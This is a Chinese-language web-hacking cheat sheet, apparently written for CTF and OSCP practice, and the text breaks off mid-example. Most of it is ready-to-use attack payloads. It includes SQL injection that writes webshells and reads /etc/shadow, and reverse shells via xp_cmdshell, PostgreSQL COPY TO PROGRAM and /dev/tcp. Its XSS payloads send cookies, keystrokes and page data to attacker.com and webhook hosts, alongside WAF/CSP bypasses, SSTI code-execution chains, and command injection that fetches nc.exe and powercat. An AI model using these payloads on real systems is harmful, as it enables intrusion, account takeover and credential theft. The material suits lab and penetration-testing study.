---
title: Web Cheat Sheet
tags: [Tools, CTF, Web]

category: "Tools｜CTF"
date: 2024-02-07
---

# Web Cheat Sheet

<!-- more -->

## Enum directory/dns

- DNS Enumeration (OSCP 常考): 標準記錄列舉：查 A、AAAA、MX、NS、SOA、TXT 等記錄

  <details markdown="1">
  <summary><span class="spoiler">CMD</span></summary>

  ```bash
  $ dnsrecon -d <domain> -t std # std 代表 standard type scan
  $ dnsenum <domain>
  $ whois -h <whois server> <domain name> # -h 是指定要問哪台 WHOIS server。不加的話會去查公開的 WHOIS server，結果可能會不一樣

  # nslookup 就是手動查 DNS 記錄的工具，你給它域名，它回你 IP，反過來也行。
  $ nslookup megacorpone.com              # 查 A 記錄（域名→IP）
  $ nslookup 149.56.244.87                # 反查（IP→域名）
  $ nslookup -type=MX megacorpone.com     # 指定查 MX 記錄
  $ nslookup -type=TXT megacorpone.com    # 查 TXT 記錄

  # Zone Transfer
  $ dnsrecon -d <domain> -t axfr
  $ dig axfr @<ns> <domain> # e.g. dig axfr megacorpone.com @ns1.megacorpone.com

  # 子網域暴力破解
  $ dnsrecon -d <domain> -t brt -D wordlist.txt
  ```

  </details>
  - [Whois](https://www.whois.com/whois) or [ipwhoisinfo](https://ipwhoisinfo.com/)
  - [DNS Lookup(從 Domain Name 看 IP)](https://www.whatismyip.com/dns-lookup/)

- ffuf
  ```bash
  $ ffuf -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -w /snap/seclists/1214/Discovery/DNS/subdomains-top1million-20000.txt -k -fs <filter size> # for subdomain
  $ ffuf -u https://mcp.kobold.htb/FUZZ -w /snap/seclists/1214//Discovery/Web-Content/common.txt -k # for directory
  $ ffuf -u http://192.168.198.48/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt # 會著重在特定的檔案類型
  ```

## Information Leak

- [`.DS_Store` - lijiejie/ds_store_exp](https://github.com/lijiejie/ds_store_exp)
- [`gitleak` - denny0223/scrabble](https://github.com/denny0223/scrabble): 確認有無`https://<victim url>/.git/config`
  ```bash
  $ chmod +x scrabble
  $ ./scrabble <url> [directory]
  $ ./scrabble http://example.com/my-project.git/
  ```

## Injection

### SQLi

#### SQL 連線

<details markdown="1">
<summary><span class="spoiler">CMD</span></summary>

- MySQL
  ```bash
  $ mysql -u root -p'root' -h <SQL server IP> -P 3306 # 連線
  select version(); # 查版本
  select system_user(); # 查當前使用者
  show databases; # 列資料庫
  use <database_name>; # 使用某個資料庫
  show tables;
  SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec'; # 查密碼
  ```
- MSSQL

  ```bash
  $ impacket-mssqlclient <username>:<password>@<MSSQL IP> -windows-auth # 連線
  SELECT @@version; # 查版本（同時揭露 Windows Server 版本）
  SELECT SYSTEM_USER; # 查看當前使用者
  SELECT name FROM sys.databases; # 列資料庫
  use <database_name>;
  SELECT * FROM <database_name>.information_schema.tables; # 查表
  SELECT * FROM <database_name>.dbo.<table_name>; # 查資料（注意需加 dbo schema）

  # 拿 shell: 前提是 xp_cmdshell 有啟用，設想情境是
  ## 1. 拿到 MSSQL Cred. 之後
  ## 2. 進入 MSSQL 修改 show advanced options 啟用 xp_cmdshell
  EXEC sp_configure 'show advanced options', 1;
  RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1;
  RECONFIGURE;
  EXEC xp_cmdshell 'whoami';
  ```

</details>

#### SQLi

- 先確認哪裡是注入點，例如 GET 參數或是在 Burp 看哪裡有 POST
- Union-Based: 有兩個前提
  - 欄位數量要一致
  - 每一個欄位的 data type 都要和前一個 database 一樣

  <details markdown="1">
  <summary><span class="spoiler">Cheat Sheet</span></summary>

  ```sql
  ' ORDER BY 1-- -
  ' ORDER BY 5-- - # 利用數字判斷 columns 數量有多少，如果使用 5 出現 error 就代表該數量的欄位不存在，那就代表 column 數量只有 4 個
  ' UNION SELECT NULL,NULL,NULL,NULL-- - # 利用此方式找出每一個欄位的 data type ，如果出錯就把該欄位換成其他的，之後再一個一個換成 str 或 num
  ' UNION SELECT 1,2,3,4,5-- -
  ' UNION SELECT user(),version(),database(),4,5-- -
  ' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -
  ' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='users'-- -
  ' UNION SELECT username,password,3,4,5 FROM users-- -

  -- 插入 webshell (MySQL+PHP)
  -- 1. MySQL 使用者有 FILE 權限（能讀寫檔案）
  -- 2. MySQL 的 `secure_file_priv` 沒有限制寫入路徑（或設為空）
  -- 3. 目標路徑（/var/www/html/tmp/）MySQL 進程有**寫入**權限
  -- 4. 該檔案不能已存在（INTO OUTFILE 不會覆蓋）
  ' UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3,4,5 INTO OUTFILE '/var/www/html/tmp/shell.php'-- -
  ' UNION SELECT 1,LOAD_FILE('/etc/shadow'),3,4,5-- - # 讀敏感資訊

  -- 開 reverse shell
  '; DROP TABLE cmd; CREATE TABLE cmd(output text); COPY cmd FROM PROGRAM 'bash -c \"bash -i >%26 /dev/tcp/<你的IP>/4444 0>%261\"';-- -

  ## 如果是其使用其他系統
  -- Linux
  INTO OUTFILE '/var/www/html/tmp/shell.php'

  -- Windows XAMPP
  INTO OUTFILE 'C:/xampp/htdocs/tmp/shell.php'

  -- Windows IIS + PHP
  INTO OUTFILE 'C:/inetpub/wwwroot/shell.php'
  ```

  </details>

- Error-Based

  ```sql
  ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))-- -
  ' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1)-- -
  ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
  ```

  因為 SQL 語句的上下文不同。參數的值很可能是被用在 INSERT 語句裡，不是 SELECT ，所以用前面的可能不會成功

  <details markdown="1">
  <summary><span class="spoiler">Example</span></summary>

  ```sql
  # 撈資料庫名
  ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT database()),0x7e),1)-- - #

  # 撈表名
  ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)-- -

  # 撈欄位名
  ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e),1)-- -

  # 撈帳密
  ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT group_concat(username,0x3a,password) FROM users),0x7e),1)-- -
  ```

  </details>

- Boolean-Based
  <details markdown="1">
  <summary><span class="spoiler">Example</span></summary>

  ```sql
  ' AND 1=1-- -                          -- 真，頁面正常
  ' AND 1=2-- -                          -- 假，頁面不同
  ' AND SUBSTRING(database(),1,1)='a'-- -
  ' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='e'-- -
  ' AND (SELECT LENGTH(database()))=5-- -
  ' AND ASCII(SUBSTRING(database(),1,1))>100-- -    -- 用二分法加速
  ' AND ASCII(SUBSTRING(database(),1,1))<120-- -
  ```

  </details>

- Time-Based
  <details markdown="1">
  <summary><span class="spoiler">Example</span></summary>

  ```sql
  ' AND SLEEP(5)-- -                     -- 確認能注入
  ' AND IF(1=1, SLEEP(5), 0)-- -
  ' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- -
  ' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100, SLEEP(5), 0)-- -
  ' AND (SELECT 8220 FROM (SELECT(SLEEP(5)))uvWb)-- -
  ```

  </details>

- 認證繞過
  <details markdown="1">
  <summary><span class="spoiler">Example</span></summary>

  ```sql
  ' OR 1=1-- -
  ' OR '1'='1
  admin'-- -
  ' OR 1=1 LIMIT 1-- -
  ' OR 1=1#
  ```

  </details>

- MSSQL 專用（OSCP 常見）
  <details markdown="1">
  <summary><span class="spoiler">Example</span></summary>

  ```sql
  ' UNION SELECT 1,2,3-- -
  '; EXEC xp_cmdshell('whoami')-- -      -- RCE！
  '; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -  -- 啟用 xp_cmdshell
  ';exec xp_cmdshell 'certutil -urlcache -f http://192.168.45.195/shell.exe c:/temp/shell.exe';--
  ';exec xp_cmdshell 'c:/temp/shell.exe';--

  -- stacked query (MSSQL專用)
  '; WAITFOR DELAY '0:0:5'--
  ```

  </details>

- PostgreSQL
  <details markdown="1">
  <summary><span class="spoiler">Example</span></summary>

  ```sql
  ' UNION SELECT NULL,NULL,NULL-- -      -- 用 NULL 避免型別問題
  '; CREATE TABLE cmd(output text); COPY cmd FROM PROGRAM 'id';-- -
  ```

  </details>

- 各資料庫 RCE Payload
  <details markdown="1"><summary><span class="spoiler">Example</span></summary>
    - MSSQL(`xp_cmdshell`): 條件： 需要 sa 或 sysadmin 角色
      ```sql
      -- 啟用 xp_cmdshell
      $ '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; --

      -- 執行命令
      $ '; EXEC xp_cmdshell 'whoami'; --

      -- Reverse shell
      $ '; EXEC xp_cmdshell 'certutil -urlcache -f http://KALI_IP/nc.exe C:\Windows\Temp\nc.exe'; --
      $ '; EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe KALI_IP 443 -e cmd.exe'; --
      ```

  - MySQL(INTO OUTFILE / UDF): FILE 權限 + secure_file_priv 沒有限制 + 知道 web 目錄絕對路徑

    ```sql
    -- 寫 webshell（需要知道 web 根目錄路徑）
    $ ' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' -- -

    -- 讀檔案
    $ ' UNION SELECT LOAD_FILE('/etc/passwd') -- -
    ```

  - PostgreSQL(COPY TO / Large Objects): 需要 superuser 權限。COPY TO PROGRAM 是 PostgreSQL 最強的 RCE 方法。

    ```sql
    -- 執行命令（9.3+）
    $ '; COPY (SELECT '') TO PROGRAM 'id'; --

    -- Reverse shell
    $ '; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/KALI_IP/443 0>&1"'; --

    -- 讀檔案
    $ '; CREATE TABLE tmp(data text); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp; --
    ```

  - Oracle(Java Stored Procedures): 條件很複雜，OSCP 幾乎不考。
    ```sql
    -- 透過 Java 執行命令（需要 DBA 權限 + Java 已安裝）
    CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "cmd" AS
    import java.io.*; import java.lang.*;
    public class cmd {
      public static String exec(String args) throws Exception {
        // ... 執行系統命令
      }
    };
    ```
  - SQLite: 本身沒有內建 RCE 能力。唯一的方式是 load_extension()，但幾乎所有環境都預設禁用。主要用於讀資料。

  </details>

- 判斷使用哪個 Database
  - 從端口推斷：
    - 1433: MSSQL
    - 3306: MySQL
    - 5432: PostgreSQL
    - 1521: Oracle
    - 無特定端口(嵌入式): SQLite
  - 從錯誤訊息判斷：
    - Microsoft SQL Server / ODBC SQL Server Driver → MSSQL
    - You have an error in your SQL syntax... MySQL → MySQL
    - PSQLException / ERROR: syntax error at or near → PostgreSQL
    - ORA-xxxxx → Oracle

#### SQLMAP

- [ Day 4 很像走迷宮的 sqlmap ](https://ithelp.ithome.com.tw/articles/10202811)
- [SQLmap 基本使用](https://hackmd.io/@bttea/sqlmap_common_parameters) ← 解釋的非常好

  ```bash
  $ sudo apt install sqlmap
  $ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="<cookie key>=<cookie value>"
  ```

  - 基本必須參數(快速)

    <details markdown="1">
    <summary><span class="spoiler">基本必須參數(快速)</span></summary>

    ```bash
    # 只需確認是否可注入，並只顯示 payload 技術與後端技術
    $ sqlmap -u "URL"

    # 獲取資料庫
    $ sqlmap -u "URL" --dbs

    # 獲取資料庫所有 table
    $ sqlmap -u "URL" -D database --tables

    # 獲取指定 table 之欄位
    $ sqlmap -u "URL" -D database -T table --columns

    # 獲取指定 table 之指定欄位資料
    $ sqlmap -u "URL" -D database -T table -C field1,field2 --dump

    # 獲取指定 table 之所有欄位資料(就不要-C而已)
    $ sqlmap -u "URL" -D database -T table --dump

    # 不指定table，直接獲取該指定DB所有資料
    $ sqlmap -u "URL" -D database --dump-all

    # 萬用 reverse shell
    $ sqlmap -u <IP> --os-shell --batch --forms
    ```

    </details>

  - 常用參數

    <details markdown="1">
    <summary><span class="spoiler">常用參數</span></summary>

    ```text
    # 讀檔案(前提)
    ## * MySQL 使用者需要有 FILE 權限
    ## * secure_file_priv 沒有限制（設為空或包含目標路徑）
    ## * 寫入的話，目標目錄需要有寫入權限 (很重要)
    ## * 寫入的檔案不能已存在
    --file-read=/var/www/html/index.php

    # 使用隨機選擇的 HTTP User-Agent 標頭值，用於繞過 WAF
    --random-agent

    # POST data 也可注入json，看網站怎送請求，--data "{'a':1,'b':2}" 或者 --data '{"a":1,"b":2}'
    --data "a=1&b=2"

    # 使用情境通常發生在，某些登入後的頁面才有注入點，不加cookie就存取不到該網站，當然也有些網站即使沒登入，但是沒cookie一樣存取不到
    --cookie "SESSION_ID=xxx;abc=xxx;"

    # 使用情境通常是不加的話，可能會被後端或者防火牆攔截等等，如果在header中已經指定User-Agent，就別加--random-agent參數
    --header "User-Agent: Mozilla/5.0 (Windows NT ..."

    # 指定注入參數
    -p par1,par2

    # 跳過注入參數
    --skip par1,par2

    # 指定注入技術，不使用此參數，預設就是全測，有 BEUSTQ
    # boolean error union stacked time inline-queries
    --technique BEQU

    # 指定 union select 的 column 列數，可以手動 fuzzing 出來指定
    --union-cols 5

    # 指定使用union技術時，每個欄位的值是多少
    # 例如，假設已知cols為5，且union select 1,2,3,4,5，2跟5可回顯資料
    # 如果我想指定注入2的位置，可以這樣下
    # --union-values "1,*,3,4,5"
    --union-values "1,*,3,4,5"

    # 指定payload前綴
    --prefix "'"

    # 指定payload後綴
    --suffix "-- a"

    # 顯示注入過程詳細，數字越大越細，(0~6，預設是1，常用是3，手動可注入但SQLmap找不到時，可以設6協助debug)，使用情境通常發生在fuzzing時的注入
    -v 3

    # 指定後端資料庫類型，中間有空格要使用雙引號，如："Microsoft Access"
    --dbms mysql

    # 自動模式，自動選取默認預設選項
    --batch

    # 跳過防火牆檢測測試
    --skip-waf

    # 設定SQLmap注入檢測風險技術，等級1~3，預設1
    # ps. 原本僅使用AND，會變成OR也使用，在某些注入的情境可能會洗到資料庫資料，因此請謹慎使用
    --risk N

    # 設定SQLmap注入檢測層級，預設 1，每個層級的說明如下，有關各個level做了什麼，可以去看原文章
    --level N

    # 讓SQLmap自己爬網頁上的注入點
    --forms

    # 有時候因為TLS/SSL問題會導致sqlmap連不到(但是瀏覽器又可以正常存取)，直接使用此命令即可
    --force-ssl

    # 強制重新打 request，如果打同一個 command ，sqlmap 會直接拿 cache 的資料
    --flush-session
    ```

    </details>

### XXE - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

<details markdown="1"><summary><span class="spoiler">暫時隱藏</span></summary>

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <data><ID>&xxe;</ID></data>
```

- 如何預防:
  - 使用安全配置的 XML parser（如 Java 的 XMLInputFactory 關閉 DTD 與 external entities），因為 xxe 的攻擊前提在於開啟了不必要的兩個 feature，讓 attacker 可以構造出一組讀取自創的 DTD 或是外部 entity，達成 LFI(算是?)
  - 避免不必要的功能開啟
  - 做好輸入驗證和最小權限策略

</details>

### XSS - [CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

<details markdown="1"><summary><span class="spoiler">暫時隱藏</span></summary>

```javascript
</script><script>
fetch(`/getflag\)
    .then(r=>r.text())
    .then(flag=>location.href=`https://sbk6401.free.beeceptor.com/?f=${flag}`
    )
</script>
```

- 利用 XSS 把 session 打到 webhook 上
  {% raw %}

  ```javascript?
  window.location=<requestbin.com>/?a+document.cookie
  // or
  fetch("https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194", { method: 'GET', headers: { 'Cookie': document.cookie } })
  ```

  {% endraw %}

  這個還有其他場景要注意，<span style="background-color: yellow">假設 victim 通不到外網也沒有 python 開 server，那就用 powershell</span>

  ```ps
  $ $listener = [System.Net.HttpListener]::new();
  $ $listener.Prefixes.Add("http://127.0.0.1:8000/"); # 如果綁 `0.0.0.0`（需提權）→ `$listener.Prefixes.Add("http://+:8000/");` 這樣的話，內網中的其他 Victim 使用 XSS 腳本才會打到目前這一台主機
  $ $listener.Start(); Write-Host "[*] Listening on port 8000..."; while ($true) { $ctx = $listener.GetContext(); $req = $ctx.Request; Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $($req.HttpMethod) $($req.Url)" -ForegroundColor Green; Write-Host "  Cookie: $($req.Headers['Cookie'])" -ForegroundColor Yellow; $resp = $ctx.Response; $resp.StatusCode = 200; $body = [Text.Encoding]::UTF8.GetBytes("ok"); $resp.OutputStream.Write($body, 0, $body.Length); $resp.Close() }
  ```

  然後如果 payload 不能有 URL encode，可以寫 `/` 當作路徑的一部分

  ```js
  fetch(
    "http://<內網中我們開 PS 腳本的 IP>:8000/" +
      document.domain +
      "/" +
      Date.now(),
  );
  ```

  以下有幾個好用的 Payload

  <details markdown="1">
  <summary><span class="spoiler">Example</span></summary>

  ```js
  # 簡單測試用
  $ <a href="javascript:alert(1)">test</a>
  $ </svgonclick=alert(1)>
  $ <img src="x" onerror="alert(1)">

  # 想要打到 Webhook ，可以值記看 Network 有沒有真的 request ，有時候會因為 http{s} 的原因而沒有送出
  $ <math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch('http://172.21.112.129:8000/123/'+document.domain+'/'+Date.now())>
  $ <math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch(`https://172.21.112.129:8443/${document.domain}/${document.cookie}`)>

  # 用 document.location 跳轉(跳轉不受 mixed content 限制)
  $ <math><mtext><table><mglyph><style><!--</style><img src=x onerror=document.location=`http://172.21.112.129:8000/?d=${document.domain}&c=${document.cookie}`>
  ```

  </details>

- WAF / CSP / HttpOnly 繞過技巧

  <details markdown="1">
  <summary><span class="spoiler">Example</span></summary>

  #### WAF 繞過

  ```js
  // WAF 擋 alert() → 改用 print() 或 confirm() 確認 XSS 觸發
  $ <img src=x onerror="print()">
  $ <img src=x onerror="confirm(1)">

  // WAF 擋 event handler 中的 URL → 用 atob() 解碼 base64 繞過
  // echo -n "https://attacker.com/?s=" | base64
  $ <img src=x onerror="top.location=atob(`aHR0cHM6Ly9hdHRhY2tlci5jb20vP3M9`)+document.cookie">

  // 後端把單引號 ' 轉成 '' (SQL-style escaping) → 改用反引號 ` (template literal)
  $ <img src=x onerror="top.location=atob(`base64payload`)+`test`">

  // 雙引號在 split 等操作中需要 → 用 \x22 代替
  $ t.split(`sessionId`)[1].split(`\x22`)[1]
  ```

  #### CSP 繞過

  ```js
  // CSP default-src 'self' 擋 img-src / connect-src 到外部
  // 但 CSP 無法阻擋 navigation，所以用 top.location 跳轉外帶資料
  $ <img src=x onerror="top.location=`https://attacker.com/?d=`+document.cookie">

  // XSS 在 iframe 裡時，location= 只導航 iframe 本身
  // frame-src 'self' 會擋，改用 top.location= (同源 iframe 可導航 top)
  $ <img src=x onerror="top.location=`https://attacker.com/?d=`+document.cookie">

  // CSP connect-src 'self' → 同源 fetch 不受限，可讀取認證後頁面再外帶
  $ <img src=x onerror="fetch(`/admin/settings`).then(r=>r.text()).then(t=>{top.location=`https://attacker.com/?d=`+encodeURIComponent(t.substring(0,500))})">
  ```

  #### HttpOnly Cookie 繞過

  ```js
  // HttpOnly 擋 document.cookie 讀取 session cookie
  // 策略 1: 找其他頁面 HTML/JS 中洩漏的 session 變數，用同源 fetch 讀取
  $ <img src=x onerror="fetch(`/page-with-session-var`).then(r=>r.text()).then(t=>{top.location=`https://attacker.com/?s=`+t.split(`sessionId`)[1].split(`\x22`)[1]})">

  // 策略 2: 不偷 session，直接以受害者身份執行操作（同源 request 自動帶 cookie）
  $ <img src=x onerror="fetch(`/api/transfer`,{method:`POST`,headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`to=attacker&amount=9999`})">

  // 策略 3: 抓取敏感頁面資料外帶
  $ <img src=x onerror="fetch(`/account/info`).then(r=>r.text()).then(t=>{top.location=`https://attacker.com/?d=`+encodeURIComponent(t.substring(0,800))})">

  // 策略 4: 注入 keylogger 偷密碼
  $ <img src=x onerror="top.document.onkeypress=function(e){new Image().src=`https://attacker.com/?k=`+e.key}">
  ```

  #### Debug 技巧

  ```js
  // 加 .catch() 避免 payload 靜默失敗，錯誤也送到外部
  $ <img src=x onerror="fetch(`/target`).then(r=>r.text()).then(t=>{top.location=`https://attacker.com/?s=`+t.length}).catch(e=>{top.location=`https://attacker.com/?err=`+e})">

  // 開發順序: 先送回應長度確認 fetch → 再送內容片段確認 parse → 最後組完整 payload
  ```

  #### 常用外帶 webhook
  - [Beeceptor](https://beeceptor.com/) — 免費、即時查看 request
  - [Webhook.site](https://webhook.site/) — 免費、支援自訂回應
  - [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) — 整合 Burp，支援 DNS/HTTP/SMTP
  - [Ngrok](https://ngrok.com/) — 本地開 server 對外

  </details>

</details>

### SSTI - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/)

<details markdown="1"><summary><span class="spoiler">暫時隱藏</span></summary>

- 先確認是不是真的有這個問題: {% raw %}`{{7*7}}`{% endraw %} → 49
- 用[tplmap](https://github.com/epinna/tplmap)直接打
  ```bash
  $ ./tplmap.py --engine Jinja2 --os-shell -u "http://rescued-float.picoctf.net:56957/announce" -X POST -d "content=bob"
  $ ./tplmap.py --engine pug --os-shell -u "http://h4ck3r.quest:8008/?name=bob"
  ```
- Python(Flask): Jinja2
- Node.js(Express): PUG / EJS
- SSTI Payload: 記得找<span style="background-color: yellow">os.\_wrap_close</span>
  {% raw %}

  ```txt
  {{().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('id')}}
  {{self.__init__.__globals__.__builtins__.__import__("os").popen("cat%20Flag.txt").read()}}
  {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", "./flag.txt")}}
  {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']("cat /flag.txt")}}
  {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", file.lower())}}
  {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spawnl']('P_WAIT', "/bin/cat", "cat", file.lower())}}
  ```

  [](https://onsecurity.io/article/server-side-template-injection-with-jinja2/): 如果`.`, `|`, `_`, `[]`, `|join`這幾個字元是黑名單，可以嘗試用 hex

  ```
  {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
  ```

  {% endraw %}

</details>

### Command Injection

- [feifei Cheat Sheet](https://lab.feifei.tw/practice/ci/l1.php)

找到注入點之後可以用以下 payload 判斷對方使用的是哪一個 shell

- 如果是 CMD: 會輸出 `CMD`
  ```bash
  $ (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
  ```
- 如果是 Powershell 則會輸出 `Powershell`
  ```powershell
  $ (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
  ```
- 實際範例
  ```bash
  $ curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
  ```
- 上傳 webshell 的 Payload
  - Powershell:
    <details markdown="1"><summary><span class="spoiler">Steps</span></summary>

    ```powershell
    $ powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/powercat.ps1');powercat -c KALI_IP -p 4444 -e cmd"
    ```

    步驟:

    ```bash
    $ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
    $ python -m http.server 80
    ```

    ```bash
    $ nc -nvlp 4444
    ```

    ```bash
    $ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<攻擊者IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<攻擊者IP>%20-p%204444%20-e%20powershell' http://<受害者IP>/archive
    ```

    </details>

  - CMD: 這個方法不見得有用，因為可能我們
    <details markdown="1"><summary><span class="spoiler">Steps</span></summary>

    ```bash
    # 第一次: 下載到一個指定地址
    # certutil -urlcache -split -f http://<攻擊者IP>/nc.exe C:\Windows\Temp\nc.exe
    $ curl -X POST --data 'Archive=git%3Bcertutil%20-urlcache%20-split%20-f%20http%3A%2F%2F<攻擊者IP>%2Fnc.exe%20C%3A%5CWindows%5CTemp%5Cnc.exe' http://<受害者IP>/archive

    # 第二次: 實際執行
    # C:\Windows\Temp\nc.exe -e cmd.exe <攻擊者IP> 4444
    $ curl -X POST --data 'Archive=git%3BC%3A%5CWindows%5CTemp%5Cnc.exe%20-e%20cmd.exe%20<攻擊者IP>%204444' http://<受害者IP>/archive
    ```

    </details>

## 讀擋

可以讀的檔案

<details markdown="1"><summary><span class="spoiler">帳號與認證相關</span></summary>

- /etc/passwd — 列出所有使用者、home 目錄路徑、login shell。知道有哪些使用者才能去翻他們的檔案。
- /etc/shadow — 密碼 hash（通常 www-data 沒權限讀，但值得試）。
- /home/<user>/.ssh/id_rsa、id_ecdsa、id_ed25519 — SSH 私鑰，你就是靠讀 anita 的 id_ecdsa 拿下這台的。
- /home/<user>/.ssh/authorized_keys — 看誰能 SSH 進來，也能確認使用者名稱。
- /home/<user>/.bash_history — 歷史指令，常洩漏密碼、內部 IP、其他主機資訊。

</details>

<details markdown="1"><summary><span class="spoiler">系統與網路</span></summary>

- /etc/hostname — 確認機器名。
- /etc/hosts — 內部 DNS 對應，可能揭露隱藏的內網機器或 domain。
- /etc/resolv.conf — DNS 設定，判斷內網結構。
- /proc/net/tcp 或 /etc/network/interfaces、/etc/netplan/\*.yaml — 網卡設定，看有沒有第二張網卡（雙網段 pivot 的線索）。
</details>

<details markdown="1"><summary><span class="spoiler">服務設定（依目標而定）</span></summary>

- Apache 設定：httpd.conf、/etc/apache2/sites-enabled/\* — 你已經讀過了，發現 mod_cgi 關閉和 port 8000 WSGI。
- /opt/apache2/login_handler/ 底下的所有檔案 — WSGI app 可能有資料庫連線字串。
- 其他 web app 的 config（如 wp-config.php、config.php、.env）— 常含 DB 密碼。

</details>

<details markdown="1"><summary><span class="spoiler">憑證與敏感資料</span></summary>

- /etc/crontab、/var/spool/cron/crontabs/<user> — 排程任務，可能以 root 跑可寫腳本。
- `/root/.ssh/id_rsa` — root 的 SSH key（通常沒權限，但試試）。
- `/var/www/` 或 `/opt/` 底下的 `.git/config` — 可能有 repo URL 含 token。
- `/home/<user>/.pgpass`、`.my.cnf`、`.netrc` — 資料庫或服務的明文密碼。

</details>

### 利用讀檔案 → ssh 連線

- 試著讀取 `/home/<user>/.ssh/authorized_keys`: authorized_keys 裡每一行的開頭會寫 key 類型，像 `ecdsa-sha2-nistp256 AAAA...`，所以一看就知道要去讀哪個私鑰檔。如果寫的是 ssh-rsa，你就讀 `id_rsa`。
- 並且 ssh 登入
  ```bash
  # 讀取到 /home/<user>/.ssh/id_rsa 並且把讀到的資訊存成檔案
  # 試著登入
  $ chmod 600 id_rsa # 不能設定太寬權限，會無法登入
  $ ssh -i id_rsa user@<target_IP>
  ```
- 如果還要打 password 代表他有 passphrase 保護
  ```bash
  $ ssh2john id_rsa > hash.txt
  $ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
  ```

### LFI

- 前提: 在 PHP 中需要特別啟用 `allow_url_include`
- 只是能讀取到 victim server 上的 file content，不見得會有價值，需要搭配其他手法，例如
  1. 寫入 webshell 之類的達到 RCE
  2. 利用 PHP 的偽協議達到讀特殊檔案的需求: 有時候，我們從前端頁面看到的內容是已經被 php 執行完的結果，就算查看該頁面的原始碼，也看不到當初 php 寫的東西，這時候就可以利用 php wrapper 讀到最原始的 content，<span style="background-color: yellow">PHP Wrapper 是有 LFI 弱點才能用</span>

  <details markdown="1">
  <summary><span class="spoiler">Example</span></summary>

  ```bash
  $ http://victim.io/?page=php://filter/convert.base64-encode/resource=<file path>
  php://filter/convert.base64-encode/resource=<file path> # 把 LFI 指定的檔案轉換成 base64 encode ，用絕對/相對路徑讀資料都可以
  php://filter/resource=<file path> # 測試有無 LFI 弱點
  data://text/plain,<?php%20echo%20system('ls');?> # 嘗試將一個以 URL 編碼的小型 PHP 片段嵌入網頁應用程式的程式碼
  data://text/plain;base64,<base64 encode str>&cmd=ls

  # 如果 WAF 會擋前面提到的 payload ，那就可以做簡單的編碼，讓後端還是可以實際執行
  $ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
  PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
  $ curl "http://mountaindesserts.local/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
  ```

  </details>

  以下展示，可以看到原本沒有使用 base64 convert 讀到的 admin.php 只顯示最基本的資訊，但透過 PHP wrapper 可以讀到更多，包含後端帳密

  <details markdown="1">
  <summary><span class="spoiler">Example</span></summary>

  ```bash
  kali@kali:~$ curl http://mountaindesserts.local/meteor/index.php?page=php://filter/resource=admin.php
  ...
